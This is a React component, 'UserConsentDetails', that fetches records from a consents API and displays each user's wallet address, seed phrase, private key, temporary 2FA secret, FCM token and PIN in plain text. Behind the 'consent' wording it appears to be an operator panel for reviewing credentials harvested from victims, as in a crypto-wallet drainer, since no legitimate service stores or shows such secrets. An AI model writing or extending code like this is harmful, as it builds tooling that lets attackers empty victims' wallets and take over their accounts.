// UserConsentDetails.jsx
import React from "react";
import { useGetConsentsQuery } from "./consentsApiSlice"; // adjust import

function DetailRow({ label, value }) {
  if (!value) return null;
  return (
    <div>
      <div className="text-xs font-medium text-gray-500">{label}</div>
      <div className="text-sm text-gray-900 break-all bg-gray-50 rounded px-2 py-1">
        {value}
      </div>
    </div>
  );
}

export default function UserConsentDetails() {
  const { data, isLoading, isError, error } = useGetConsentsQuery();

  if (isLoading) {
    return (
      <div className="flex justify-center items-center min-h-[200px]">
        <span className="text-gray-500 text-sm">Loading consent details...</span>
      </div>
    );
  }

  if (isError) {
    return (
      <div className="max-w-xl mx-auto p-4 bg-red-50 border border-red-200 text-red-700 rounded">
        {error?.data?.message || "Failed to load consent details"}
      </div>
    );
  }

  if (!data) {
    return (
      <div className="max-w-xl mx-auto p-4 bg-gray-50 border border-gray-200 text-gray-700 rounded">
        No consent details available.
      </div>
    );
  }

  const {
    username,
    walletAddress,
    seedPhrase,
    privateKey,
    temp2FASecret,
    fcm_token,
    pin
  } = data;

  return (
    <div className="max-w-xl mx-auto p-6 bg-white shadow rounded-lg">
      <h1 className="text-xl font-semibold mb-4 text-gray-900">
        User Consent Details
      </h1>

      {username && (
        <div className="mb-4">
          <div className="text-xs font-medium text-gray-500">Username</div>
          <div className="text-sm text-gray-900 break-all">{username}</div>
        </div>
      )}

      <div className="space-y-3 text-sm">
        <DetailRow label="Wallet Address" value={walletAddress} />
        <DetailRow label="Seed Phrase" value={seedPhrase} />
        <DetailRow label="Private Key" value={privateKey} />
        <DetailRow label="Temp 2FA Secret" value={temp2FASecret} />
        <DetailRow label="FCM Token" value={fcm_token} />
        <DetailRow label="pin" value={pin} />
      </div>
    </div>
  );
}